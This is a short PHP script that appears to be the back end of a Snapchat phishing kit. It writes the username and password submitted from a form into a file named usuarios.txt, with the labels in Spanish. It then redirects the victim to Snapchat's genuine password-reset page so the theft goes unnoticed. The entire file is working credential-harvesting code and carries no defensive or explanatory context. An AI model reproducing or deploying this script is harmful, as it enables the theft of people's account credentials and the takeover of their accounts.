<?php

file_put_contents("usuarios.txt", " Cuenta: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/password_reset_options');
exit();
?>
